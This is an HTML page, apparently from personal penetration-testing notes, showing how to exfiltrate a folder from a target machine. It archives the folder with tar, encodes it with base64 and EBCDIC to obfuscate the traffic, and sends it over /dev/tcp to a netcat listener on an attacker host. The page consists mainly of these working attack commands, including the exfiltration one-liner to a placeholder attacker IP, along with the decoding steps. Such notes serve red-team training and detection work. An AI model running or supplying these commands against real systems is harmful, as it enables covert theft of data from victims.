<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exfiltration over TCP Socket with EBCDIC and Base64</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Exfiltration over TCP Socket with EBCDIC and Base64</h1><br /><br />In this example, on our target
    machine, we will simultaneously “tar” (archive) the data, encode it with <a
      href="https://en.wikipedia.org/wiki/Base64" target="_blank">Base64</a> and <a
      href="https://en.wikipedia.org/wiki/EBCDIC" target="_blank">EBCDIC</a> (Extended Binary Coded Decimal Interchange Code) encodings
    and ship the archive to our attacker system over a TCP socket in order to better obfuscate our
    traffic.<br /><br />1. On our attacker system, we first configure our netcat listener on port TCP/80 to receive
    incoming data while redirecting the output to a “datafolder.tmp” file:<br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;mkdir&nbsp;extraction<br />attacker@kali:/#&nbsp;nc&nbsp;-nlvp&nbsp;80&nbsp;&gt;&nbsp;datafolder.tmp
      </div>
    </div> <br /><br />2. On our target system, we tar the datafolder to standard output (stdout) (-), <span
      style="text-decoration:underline;">encode with both BASE64 and EBCDIC</span>, and redirect the data over a local
    TCP socket to our attacker machine. In the below example, “datafolder” is the folder containing the data:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:/$&nbsp;mkdir&nbsp;/tmp/datafolder<br />target@debian:/$&nbsp;echo&nbsp;provatesto&nbsp;&gt;&nbsp;prova.txt<br />target@debian:/$&nbsp;
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        target@debian:/$&nbsp;tar&nbsp;zcf&nbsp;-&nbsp;/tmp/datafolder&nbsp;|&nbsp;base64&nbsp;|&nbsp;dd&nbsp;conv=ebcdic&nbsp;&gt;&nbsp;/dev/tcp/&lt;attacker_IP&gt;/80
      </div>
    </div><br /> <a href=""><img src="images/1465-1.png" alt="images/1465-1.png" /></a><br /><br />3. On our attacker
    machine, we decode the received datafolder.tmp file from EBCDIC back to ASCII, decode the BASE64 and redirect the
    output to a datafolder.tar file:<br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;dd&nbsp;conv=ascii&nbsp;if=datafolder.tmp&nbsp;|base64&nbsp;-d&nbsp;&gt;&nbsp;datafolder.tar
      </div>
    </div><br /> <a href=""><img src="images/1465-2.png" alt="images/1465-2.png" /></a><br />4. Extract our tar
    archive:<br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;tar&nbsp;xf&nbsp;datafolder.tar<br />attacker@kali:/#&nbsp;ls<br />attacker@kali:/#&nbsp;cd&nbsp;datafolder<br />attacker@kali:/#&nbsp;ls
      </div>
    </div><br /> <a href=""><img src="images/1465-3.png" alt="images/1465-3.png" /></a>
  </div>
</body>

</html>